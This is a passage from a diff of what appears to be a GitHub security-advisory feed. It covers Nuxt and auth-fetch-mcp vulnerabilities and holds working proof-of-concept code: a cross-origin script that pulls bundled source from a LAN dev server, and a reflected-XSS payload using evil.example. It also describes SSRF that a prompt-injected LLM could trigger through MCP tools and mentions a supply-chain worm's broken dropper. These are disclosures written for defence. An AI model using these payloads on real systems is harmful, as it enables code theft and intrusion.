+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g">https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g</a></li>
+<li><a href="https://github.com/nuxt/nuxt/pull/35051">https://github.com/nuxt/nuxt/pull/35051</a></li>
+<li><a href="https://github.com/advisories/GHSA-6m52-m754-pw2g">https://github.com/advisories/GHSA-6m52-m754-pw2g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6m52-m754-pw2g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T15:51:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@nuxt/webpack-builder] Nuxt: Dev server exposes built source over LAN to malicious sites (incomplete fix for GHSA-4gf7-ff8x-hq99)]]></title>
+        <id>https://github.com/advisories/GHSA-6m52-m754-pw2g</id>
+        <link href="https://github.com/advisories/GHSA-6m52-m754-pw2g"/>
+        <updated>2026-05-19T15:51:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>This is an incomplete fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a>. Source code may be stolen during dev when using the webpack / rspack builder if the dev server is bound to a non-loopback address (e.g. <code>nuxt dev --host</code>) and the developer opens a malicious site on the same network.</p>
+<h3 id="details">Details</h3>
+<p>The fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a> relied on Sec-Fetch-Mode and Sec-Fetch-Site headers. Because <a href="https://w3c.github.io/webappsec-fetch-metadata/#sec-fetch-site-header:~:text=Site%20header%20for%20a%20request%20r%3A-,Assert%3A%20r%E2%80%99s%20url%20is%20a%20potentially%20trustworthy%20URL.,-Let%20header%20be%20a%20Structured%20Field%20whose">these headers are sent by the browsers only for potentially trustworthy origins</a>, the check is able to bypass for non-potentially trustworthy origins.</p>
+<p>Since the attack requires the website to be accessible via a non-potentially trustworthy origin, only apps that are using <code>--host</code> is affected.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a nuxt project with webpack / rspack builder.</li>
+<li>Run <code>npm run dev</code></li>
+<li>Open <code>http://localhost:3000</code></li>
+<li>Run the script below in a web site that has a different origin.</li>
+<li>You can see the source code output in the document and the devtools console.</li>
+</ol>
+<pre><code class="language-js">const script = document.createElement('script')
+script.src = 'http://192.168.0.31:3000/_nuxt/app.js' // NOTE: replace with the IP address the dev server listens to
+script.addEventListener('load', () =&gt; {
+  const key = Object.keys(window).find(k =&gt; k.startsWith("webpackChunk"))
+  for (const page in window[key]) {
+    const moduleList = window[key][page][1]
+    console.log(moduleList)
+
+    for (const key in moduleList) {
+      const p = document.createElement('p')
+      const title = document.createElement('strong')
+      title.textContent = key
+      const code = document.createElement('code')
+      code.textContent = moduleList[key].toString()
+      p.append(title, ':', document.createElement('br'), code)
+      document.body.appendChild(p)
+    }
+  }
+})
+document.head.appendChild(script)
+</code></pre>
+<p>(This script is the similar with <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a> except for the <code>script.src</code> and the global variable name)</p>
+<h3 id="impact">Impact</h3>
+<p>Users using webpack / rspack builder may get the source code stolen by malicious websites if it uses a predictable host and also is using <code>--host</code>.</p>
+<p>This vulnerability does not affect Chrome 142+ (and other Chromium based browsers) users due to <a href="https://developer.chrome.com/release-notes/142#local_network_access_restrictions">the local network access restriction feature</a>.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>nuxt@4.4.6</code> and <code>nuxt@3.21.6</code> by <a href="https://github.com/nuxt/nuxt/pull/35051">#35051</a>. The dev-middleware same-origin check now falls back to comparing the request's <code>Origin</code> / <code>Referer</code> host against <code>Host</code> when <code>Sec-Fetch-*</code> headers are absent, closing the non-trustworthy-origin bypass.</p>
+<p>The fix only ships for the <code>@nuxt/webpack-builder</code> and <code>@nuxt/rspack-builder</code> packages. The default Vite builder was not affected.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade immediately:</p>
+<ul>
+<li>Don't use <code>nuxt dev --host</code>. Bind the dev server to <code>localhost</code> (the default) and tunnel from other devices via SSH or a reverse proxy that enforces same-origin checks.</li>
+<li>Use Chrome 142+ or another Chromium-based browser that enforces <a href="https://developer.chrome.com/release-notes/142#local_network_access_restrictions">local network access restrictions</a>.</li>
+<li>Switch to the Vite builder for development.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g">https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g</a></li>
+<li><a href="https://github.com/nuxt/nuxt/pull/35051">https://github.com/nuxt/nuxt/pull/35051</a></li>
+<li><a href="https://github.com/advisories/GHSA-6m52-m754-pw2g">https://github.com/advisories/GHSA-6m52-m754-pw2g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6m52-m754-pw2g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T15:51:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@nuxt/rspack-builder] Nuxt: Dev server exposes built source over LAN to malicious sites (incomplete fix for GHSA-4gf7-ff8x-hq99)]]></title>
+        <id>https://github.com/advisories/GHSA-6m52-m754-pw2g</id>
+        <link href="https://github.com/advisories/GHSA-6m52-m754-pw2g"/>
+        <updated>2026-05-19T15:51:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>This is an incomplete fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a>. Source code may be stolen during dev when using the webpack / rspack builder if the dev server is bound to a non-loopback address (e.g. <code>nuxt dev --host</code>) and the developer opens a malicious site on the same network.</p>
+<h3 id="details">Details</h3>
+<p>The fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a> relied on Sec-Fetch-Mode and Sec-Fetch-Site headers. Because <a href="https://w3c.github.io/webappsec-fetch-metadata/#sec-fetch-site-header:~:text=Site%20header%20for%20a%20request%20r%3A-,Assert%3A%20r%E2%80%99s%20url%20is%20a%20potentially%20trustworthy%20URL.,-Let%20header%20be%20a%20Structured%20Field%20whose">these headers are sent by the browsers only for potentially trustworthy origins</a>, the check is able to bypass for non-potentially trustworthy origins.</p>
+<p>Since the attack requires the website to be accessible via a non-potentially trustworthy origin, only apps that are using <code>--host</code> is affected.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a nuxt project with webpack / rspack builder.</li>
+<li>Run <code>npm run dev</code></li>
+<li>Open <code>http://localhost:3000</code></li>
+<li>Run the script below in a web site that has a different origin.</li>
+<li>You can see the source code output in the document and the devtools console.</li>
+</ol>
+<pre><code class="language-js">const script = document.createElement('script')
+script.src = 'http://192.168.0.31:3000/_nuxt/app.js' // NOTE: replace with the IP address the dev server listens to
+script.addEventListener('load', () =&gt; {
+  const key = Object.keys(window).find(k =&gt; k.startsWith("webpackChunk"))
+  for (const page in window[key]) {
+    const moduleList = window[key][page][1]
+    console.log(moduleList)
+
+    for (const key in moduleList) {
+      const p = document.createElement('p')
+      const title = document.createElement('strong')
+      title.textContent = key
+      const code = document.createElement('code')
+      code.textContent = moduleList[key].toString()
+      p.append(title, ':', document.createElement('br'), code)
+      document.body.appendChild(p)
+    }
+  }
+})
+document.head.appendChild(script)
+</code></pre>
+<p>(This script is the similar with <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a> except for the <code>script.src</code> and the global variable name)</p>
+<h3 id="impact">Impact</h3>
+<p>Users using webpack / rspack builder may get the source code stolen by malicious websites if it uses a predictable host and also is using <code>--host</code>.</p>
+<p>This vulnerability does not affect Chrome 142+ (and other Chromium based browsers) users due to <a href="https://developer.chrome.com/release-notes/142#local_network_access_restrictions">the local network access restriction feature</a>.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>nuxt@4.4.6</code> and <code>nuxt@3.21.6</code> by <a href="https://github.com/nuxt/nuxt/pull/35051">#35051</a>. The dev-middleware same-origin check now falls back to comparing the request's <code>Origin</code> / <code>Referer</code> host against <code>Host</code> when <code>Sec-Fetch-*</code> headers are absent, closing the non-trustworthy-origin bypass.</p>
+<p>The fix only ships for the <code>@nuxt/webpack-builder</code> and <code>@nuxt/rspack-builder</code> packages. The default Vite builder was not affected.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade immediately:</p>
+<ul>
+<li>Don't use <code>nuxt dev --host</code>. Bind the dev server to <code>localhost</code> (the default) and tunnel from other devices via SSH or a reverse proxy that enforces same-origin checks.</li>
+<li>Use Chrome 142+ or another Chromium-based browser that enforces <a href="https://developer.chrome.com/release-notes/142#local_network_access_restrictions">local network access restrictions</a>.</li>
+<li>Switch to the Vite builder for development.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g">https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g</a></li>
+<li><a href="https://github.com/nuxt/nuxt/pull/35051">https://github.com/nuxt/nuxt/pull/35051</a></li>
+<li><a href="https://github.com/advisories/GHSA-6m52-m754-pw2g">https://github.com/advisories/GHSA-6m52-m754-pw2g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6m52-m754-pw2g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T15:51:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[@nuxt/rspack-builder] Nuxt: Dev server exposes built source over LAN to malicious sites (incomplete fix for GHSA-4gf7-ff8x-hq99)]]></title>
+        <id>https://github.com/advisories/GHSA-6m52-m754-pw2g</id>
+        <link href="https://github.com/advisories/GHSA-6m52-m754-pw2g"/>
+        <updated>2026-05-19T15:51:17.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p>This is an incomplete fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a>. Source code may be stolen during dev when using the webpack / rspack builder if the dev server is bound to a non-loopback address (e.g. <code>nuxt dev --host</code>) and the developer opens a malicious site on the same network.</p>
+<h3 id="details">Details</h3>
+<p>The fix for <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a> relied on Sec-Fetch-Mode and Sec-Fetch-Site headers. Because <a href="https://w3c.github.io/webappsec-fetch-metadata/#sec-fetch-site-header:~:text=Site%20header%20for%20a%20request%20r%3A-,Assert%3A%20r%E2%80%99s%20url%20is%20a%20potentially%20trustworthy%20URL.,-Let%20header%20be%20a%20Structured%20Field%20whose">these headers are sent by the browsers only for potentially trustworthy origins</a>, the check is able to bypass for non-potentially trustworthy origins.</p>
+<p>Since the attack requires the website to be accessible via a non-potentially trustworthy origin, only apps that are using <code>--host</code> is affected.</p>
+<h3 id="poc">PoC</h3>
+<ol>
+<li>Create a nuxt project with webpack / rspack builder.</li>
+<li>Run <code>npm run dev</code></li>
+<li>Open <code>http://localhost:3000</code></li>
+<li>Run the script below in a web site that has a different origin.</li>
+<li>You can see the source code output in the document and the devtools console.</li>
+</ol>
+<pre><code class="language-js">const script = document.createElement('script')
+script.src = 'http://192.168.0.31:3000/_nuxt/app.js' // NOTE: replace with the IP address the dev server listens to
+script.addEventListener('load', () =&gt; {
+  const key = Object.keys(window).find(k =&gt; k.startsWith("webpackChunk"))
+  for (const page in window[key]) {
+    const moduleList = window[key][page][1]
+    console.log(moduleList)
+
+    for (const key in moduleList) {
+      const p = document.createElement('p')
+      const title = document.createElement('strong')
+      title.textContent = key
+      const code = document.createElement('code')
+      code.textContent = moduleList[key].toString()
+      p.append(title, ':', document.createElement('br'), code)
+      document.body.appendChild(p)
+    }
+  }
+})
+document.head.appendChild(script)
+</code></pre>
+<p>(This script is the similar with <a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-4gf7-ff8x-hq99">GHSA-4gf7-ff8x-hq99</a> except for the <code>script.src</code> and the global variable name)</p>
+<h3 id="impact">Impact</h3>
+<p>Users using webpack / rspack builder may get the source code stolen by malicious websites if it uses a predictable host and also is using <code>--host</code>.</p>
+<p>This vulnerability does not affect Chrome 142+ (and other Chromium based browsers) users due to <a href="https://developer.chrome.com/release-notes/142#local_network_access_restrictions">the local network access restriction feature</a>.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>nuxt@4.4.6</code> and <code>nuxt@3.21.6</code> by <a href="https://github.com/nuxt/nuxt/pull/35051">#35051</a>. The dev-middleware same-origin check now falls back to comparing the request's <code>Origin</code> / <code>Referer</code> host against <code>Host</code> when <code>Sec-Fetch-*</code> headers are absent, closing the non-trustworthy-origin bypass.</p>
+<p>The fix only ships for the <code>@nuxt/webpack-builder</code> and <code>@nuxt/rspack-builder</code> packages. The default Vite builder was not affected.</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you cannot upgrade immediately:</p>
+<ul>
+<li>Don't use <code>nuxt dev --host</code>. Bind the dev server to <code>localhost</code> (the default) and tunnel from other devices via SSH or a reverse proxy that enforces same-origin checks.</li>
+<li>Use Chrome 142+ or another Chromium-based browser that enforces <a href="https://developer.chrome.com/release-notes/142#local_network_access_restrictions">local network access restrictions</a>.</li>
+<li>Switch to the Vite builder for development.</li>
+</ul>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g">https://github.com/nuxt/nuxt/security/advisories/GHSA-6m52-m754-pw2g</a></li>
+<li><a href="https://github.com/nuxt/nuxt/pull/35051">https://github.com/nuxt/nuxt/pull/35051</a></li>
+<li><a href="https://github.com/advisories/GHSA-6m52-m754-pw2g">https://github.com/advisories/GHSA-6m52-m754-pw2g</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-6m52-m754-pw2g</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T15:51:14.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nuxt] Nuxt: Reflected XSS in `navigateTo()` external redirect]]></title>
+        <id>https://github.com/advisories/GHSA-fx6j-w5w5-h468</id>
+        <link href="https://github.com/advisories/GHSA-fx6j-w5w5-h468"/>
+        <updated>2026-05-19T15:49:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>navigateTo()</code> with <code>external: true</code> generates a server-side HTML redirect body containing a <code>&lt;meta http-equiv="refresh"&gt;</code> tag. The destination URL is only sanitized by replacing <code>"</code> with <code>%22</code>, leaving <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, and <code>'</code> unencoded. An attacker who can influence the URL passed to <code>navigateTo(url, { external: true })</code> can break out of the <code>content="…"</code> attribute and inject arbitrary HTML/JavaScript that executes under the application's origin.</p>
+<p>This is a different root cause from CVE-2024-34343 (GHSA-vf6r-87q4-2vjf), which addressed <code>javascript:</code> protocol bypass. The issue here is triggered by any valid URL containing <code>&gt;</code>.</p>
+<h3 id="impact">Impact</h3>
+<p>Applications that pass user-controlled input to <code>navigateTo(url, { external: true })</code> — typically via a <code>?next=</code> / <code>?redirect=</code> query parameter used for post-login or "return to" flows — are vulnerable to reflected cross-site scripting. The injected script runs in the context of the application's origin during the server-rendered redirect response, before the meta-refresh fires.</p>
+<h3 id="details">Details</h3>
+<p>In <code>packages/nuxt/src/app/composables/router.ts</code>, the SSR redirect path builds an HTML response body with only <code>"</code> percent-encoded in the destination URL:</p>
+<pre><code class="language-ts">const encodedLoc = location.replace(/"/g, '%22')
+nuxtApp.ssrContext!['~renderResponse'] = {
+status: sanitizeStatusCode(options?.redirectCode || 302, 302),
+body: `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0; url=${encodedLoc}"&gt;&lt;/head&gt;&lt;/html&gt;`,
+headers: { location: encodeURL(location, isExternalHost) },
+}
+</code></pre>
+<p>The <code>Location</code> header is normalised through <code>encodeURL()</code> (which uses the <code>URL</code> constructor and correctly percent-encodes attribute-significant characters). The HTML body uses a narrower sanitiser. That mismatch is the root cause.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Global middleware that forwards a query parameter to <code>navigateTo</code>:</p>
+<pre><code class="language-ts">// middleware/redirect.global.ts
+export default defineNuxtRouteMiddleware((to) =&gt; {
+const next = to.query.next as string | undefined
+if (next) {
+ return navigateTo(next, { external: true })
+}
+})
+</code></pre>
+<p>Request:</p>
+<pre><code>GET /?next=https://evil.example/x&gt;&lt;img src=x onerror=alert(document.domain)&gt;
+</code></pre>
+<p>Response body:</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0; url=https://evil.example/x&gt;&lt;img src=x onerror=alert(document.domain)&gt;"&gt;&lt;/head&gt;&lt;/html&gt;
+</code></pre>
+<p>The <code>&gt;</code> after <code>evil.example/x</code> terminates the <code>content="…"</code> attribute, and the <code>&lt;img onerror&gt;</code> tag executes JavaScript in the application's origin before any redirect
+occurs.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>nuxt@4.4.6</code> and <code>nuxt@3.21.6</code> by <a href="https://github.com/nuxt/nuxt/pull/35052">#35052</a>. The fix percent-encodes the full set of HTML-attribute-significant characters (<code>&amp;</code>, <code>"</code>, <code>'</code>, <code>&lt;</code>, <code>&gt;</code>) before interpolating the URL into the meta-refresh body</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you can't upgrade immediately, validate user-controlled URLs before passing them to <code>navigateTo(url, { external: true })</code>. At minimum, normalise through <code>new URL(input).toString()</code> and reject inputs containing <code>&lt;</code> or <code>&gt;</code> (a normalised URL with these characters is malformed and safe to refuse).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-fx6j-w5w5-h468">https://github.com/nuxt/nuxt/security/advisories/GHSA-fx6j-w5w5-h468</a></li>
+<li><a href="https://github.com/nuxt/nuxt/pull/35052">https://github.com/nuxt/nuxt/pull/35052</a></li>
+<li><a href="https://github.com/advisories/GHSA-fx6j-w5w5-h468">https://github.com/advisories/GHSA-fx6j-w5w5-h468</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fx6j-w5w5-h468</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T15:49:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[nuxt] Nuxt: Reflected XSS in `navigateTo()` external redirect]]></title>
+        <id>https://github.com/advisories/GHSA-fx6j-w5w5-h468</id>
+        <link href="https://github.com/advisories/GHSA-fx6j-w5w5-h468"/>
+        <updated>2026-05-19T15:49:26.000Z</updated>
+        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
+<p><code>navigateTo()</code> with <code>external: true</code> generates a server-side HTML redirect body containing a <code>&lt;meta http-equiv="refresh"&gt;</code> tag. The destination URL is only sanitized by replacing <code>"</code> with <code>%22</code>, leaving <code>&lt;</code>, <code>&gt;</code>, <code>&amp;</code>, and <code>'</code> unencoded. An attacker who can influence the URL passed to <code>navigateTo(url, { external: true })</code> can break out of the <code>content="…"</code> attribute and inject arbitrary HTML/JavaScript that executes under the application's origin.</p>
+<p>This is a different root cause from CVE-2024-34343 (GHSA-vf6r-87q4-2vjf), which addressed <code>javascript:</code> protocol bypass. The issue here is triggered by any valid URL containing <code>&gt;</code>.</p>
+<h3 id="impact">Impact</h3>
+<p>Applications that pass user-controlled input to <code>navigateTo(url, { external: true })</code> — typically via a <code>?next=</code> / <code>?redirect=</code> query parameter used for post-login or "return to" flows — are vulnerable to reflected cross-site scripting. The injected script runs in the context of the application's origin during the server-rendered redirect response, before the meta-refresh fires.</p>
+<h3 id="details">Details</h3>
+<p>In <code>packages/nuxt/src/app/composables/router.ts</code>, the SSR redirect path builds an HTML response body with only <code>"</code> percent-encoded in the destination URL:</p>
+<pre><code class="language-ts">const encodedLoc = location.replace(/"/g, '%22')
+nuxtApp.ssrContext!['~renderResponse'] = {
+status: sanitizeStatusCode(options?.redirectCode || 302, 302),
+body: `&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0; url=${encodedLoc}"&gt;&lt;/head&gt;&lt;/html&gt;`,
+headers: { location: encodeURL(location, isExternalHost) },
+}
+</code></pre>
+<p>The <code>Location</code> header is normalised through <code>encodeURL()</code> (which uses the <code>URL</code> constructor and correctly percent-encodes attribute-significant characters). The HTML body uses a narrower sanitiser. That mismatch is the root cause.</p>
+<h3 id="proof-of-concept">Proof of concept</h3>
+<p>Global middleware that forwards a query parameter to <code>navigateTo</code>:</p>
+<pre><code class="language-ts">// middleware/redirect.global.ts
+export default defineNuxtRouteMiddleware((to) =&gt; {
+const next = to.query.next as string | undefined
+if (next) {
+ return navigateTo(next, { external: true })
+}
+})
+</code></pre>
+<p>Request:</p>
+<pre><code>GET /?next=https://evil.example/x&gt;&lt;img src=x onerror=alert(document.domain)&gt;
+</code></pre>
+<p>Response body:</p>
+<pre><code class="language-html">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;meta http-equiv="refresh" content="0; url=https://evil.example/x&gt;&lt;img src=x onerror=alert(document.domain)&gt;"&gt;&lt;/head&gt;&lt;/html&gt;
+</code></pre>
+<p>The <code>&gt;</code> after <code>evil.example/x</code> terminates the <code>content="…"</code> attribute, and the <code>&lt;img onerror&gt;</code> tag executes JavaScript in the application's origin before any redirect
+occurs.</p>
+<h3 id="patches">Patches</h3>
+<p>Fixed in <code>nuxt@4.4.6</code> and <code>nuxt@3.21.6</code> by <a href="https://github.com/nuxt/nuxt/pull/35052">#35052</a>. The fix percent-encodes the full set of HTML-attribute-significant characters (<code>&amp;</code>, <code>"</code>, <code>'</code>, <code>&lt;</code>, <code>&gt;</code>) before interpolating the URL into the meta-refresh body</p>
+<h3 id="workarounds">Workarounds</h3>
+<p>If you can't upgrade immediately, validate user-controlled URLs before passing them to <code>navigateTo(url, { external: true })</code>. At minimum, normalise through <code>new URL(input).toString()</code> and reject inputs containing <code>&lt;</code> or <code>&gt;</code> (a normalised URL with these characters is malformed and safe to refuse).</p>
+<h3 id="references">References</h3>
+<ul>
+<li><a href="https://github.com/nuxt/nuxt/security/advisories/GHSA-fx6j-w5w5-h468">https://github.com/nuxt/nuxt/security/advisories/GHSA-fx6j-w5w5-h468</a></li>
+<li><a href="https://github.com/nuxt/nuxt/pull/35052">https://github.com/nuxt/nuxt/pull/35052</a></li>
+<li><a href="https://github.com/advisories/GHSA-fx6j-w5w5-h468">https://github.com/advisories/GHSA-fx6j-w5w5-h468</a></li>
+</ul>
+]]></content>
+        <author>
+            <name>GitHub</name>
+            <email>GitHub@noreply.github.com</email>
+            <uri>https://github.com/advisories/GHSA-fx6j-w5w5-h468</uri>
+        </author>
+        <category label="severity" term="MODERATE"/>
+        <published>2026-05-19T15:49:25.000Z</published>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[auth-fetch-mcp] auth-fetch-mcp: SSRF and disk exfiltration via unvalidated auth_fetch and download_media URLs]]></title>
+        <id>https://github.com/advisories/GHSA-hv85-774v-26fg</id>
+        <link href="https://github.com/advisories/GHSA-hv85-774v-26fg"/>
+        <updated>2026-05-19T15:47:29.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="ssrf--disk-exfil-in-download_media-and-auth_fetch-tools--ymw0407auth-fetch-mcp">SSRF + disk-exfil in <code>download_media</code> and <code>auth_fetch</code> tools — ymw0407/auth-fetch-mcp</h1>
+<h2 id="severity">Severity</h2>
+<p>The <code>download_media</code> and <code>auth_fetch</code> MCP tools accept arbitrary URLs and reach them as the MCP server process, with <code>download_media</code> additionally persisting the fetched response body to a user-controlled output directory. An MCP client (LLM under prompt injection, malicious peer) can drive the server to fetch loopback / link-local / private-range hosts (cloud-instance metadata, internal services, host-bound services) and exfiltrate the response.</p>
+<h2 id="vulnerability-chain">Vulnerability chain</h2>
+<h3 id="site-1-download_media--ssrf--disk-write-chain">Site 1: <code>download_media</code> — SSRF + disk-write chain</h3>
+<p><code>src/tools.ts:200-274</code></p>
+<pre><code class="language-ts">server.registerTool("download_media", {
+  inputSchema: {
+    urls: z.array(z.string()).describe("One or more URLs to download"),
+    output_dir: z.string().optional()...,
+  },
+}, async ({ urls, output_dir }) =&gt; {
+  ...
+  for (const url of urls) {
+    try {
+      const response = await ctx.request.get(url);   // line 238 — no validation
+      ...
+      const body = await response.body();
+      ...
+      const filePath = path.join(dir, `file-${++counter}${ext}`);
+      fs.writeFileSync(filePath, body);              // line 257 — writes response to disk
+</code></pre>
+<p><code>urls</code> and <code>output_dir</code> are user-controlled. The handler iterates each URL (line 236) and calls <code>ctx.request.get(url)</code> (Playwright's <code>APIRequestContext.get</code>) without checking the destination. The response body is written to <code>path.join(output_dir, file-N.ext)</code>. Internal-service responses are persisted to disk where they can be exfiltrated via any subsequent tool that reads from the output directory (or via the response object itself, which contains <code>localPath</code> and <code>size</code> of every successful write).</p>
+<h3 id="site-2-auth_fetch--ssrf-via-playwright-navigation">Site 2: <code>auth_fetch</code> — SSRF via Playwright navigation</h3>
+<p><code>src/tools.ts:117-198</code></p>
+<pre><code class="language-ts">server.registerTool("auth_fetch", {
+  inputSchema: {
+    url: z.string().describe("The URL to fetch content from"),
+    wait_for: z.string().optional()...,
+  },
+}, async ({ url, wait_for }) =&gt; {
+  ...
+  const page = await navigateTo(ctx, url);           // line 142
+  ...
+  const result = await extractContent(page);
+  return textResult({ status: "ok", url: result.url, title: result.title, content: result.content });
 });
 </code></pre>
-<h3 id="patches">Patches</h3>
-<p>The vulnerability was fixed in <a href="mailto:ws@8.20.1">ws@8.20.1</a> (<a href="https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086">https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086</a>).</p>
-<h3 id="credits">Credits</h3>
-<p>Credit for the private and responsible disclosure of this issue goes to <a href="https://github.com/ChALkeR">Nikita Skovoroda</a>.</p>
-<h3 id="remarks">Remarks</h3>
-<p>Although the calculated CVSS severity is medium, the actual severity is believed to be low, as the flaw is only exploitable through misuse that is unlikely in practice.</p>
-<h3 id="resources">Resources</h3>
-<ul>
-<li><a href="https://github.com/advisories/GHSA-58qx-3vcg-4xpx">https://github.com/advisories/GHSA-58qx-3vcg-4xpx</a></li>
-<li><a href="https://www.cve.org/CVERecord?id=CVE-2026-45736">https://www.cve.org/CVERecord?id=CVE-2026-45736</a></li>
-</ul>
-<h3 id="references">References</h3>
-<ul>
-<li><a href="https://github.com/websockets/ws/security/advisories/GHSA-58qx-3vcg-4xpx">https://github.com/websockets/ws/security/advisories/GHSA-58qx-3vcg-4xpx</a></li>
-<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2026-45736">https://nvd.nist.gov/vuln/detail/CVE-2026-45736</a></li>
-<li><a href="https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086">https://github.com/websockets/ws/commit/c0327ec15a54d701eb6ccefaa8bef328cfc03086</a></li>
-<li><a href="https://github.com/advisories/GHSA-58qx-3vcg-4xpx">https://github.com/advisories/GHSA-58qx-3vcg-4xpx</a></li>
-</ul>
-]]></content>
-        <author>
-            <name>GitHub</name>
-            <email>GitHub@noreply.github.com</email>
-            <uri>https://github.com/advisories/GHSA-58qx-3vcg-4xpx</uri>
-        </author>
-        <category label="severity" term="MODERATE"/>
-        <published>2026-05-18T19:02:40.000Z</published>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[[@mistralai/mistralai-gcp] Broken dropper in @mistralai/mistralai, @mistralai/mistralai-azure, @mistralai/mistralai-gcp]]></title>
-        <id>https://github.com/advisories/GHSA-jgg6-4rpr-wfh7</id>
-        <link href="https://github.com/advisories/GHSA-jgg6-4rpr-wfh7"/>
-        <updated>2026-05-18T17:55:55.000Z</updated>
-        <content type="html"><![CDATA[<p>Mistral npm <code>@mistralai/mistralai</code>, <code>@mistralai/mistralai-azure</code>, <code>@mistralai/mistralai-gcp</code> were compromised by a supply chain attack related to the <a href="https://github.com/TanStack/router/security/advisories/GHSA-g7cv-rxg3-hmpx">TanStack security incident</a>. An automated worm associated with the attack led to <strong>compromised npm package versions being published</strong>.</p>
-<p>Current investigation indicates that an affected developer device was involved. We have no indication that Mistral infrastructure was compromised. The compromised versions were removed from npm. They were available only between May 11 at 22:45 UTC and May 12 at 01:53 UTC. <strong>Previous and later versions are not affected by this advisory</strong>.</p>
-<h2 id="impact">Impact</h2>
-<p>The dropper <strong>is broken</strong>, it has no impact. </p>
-<ul>
-<li><code>setup.mjs</code> references <code>tanstack_runner.js</code> but the payload file is named <code>router_init.js</code><ul>
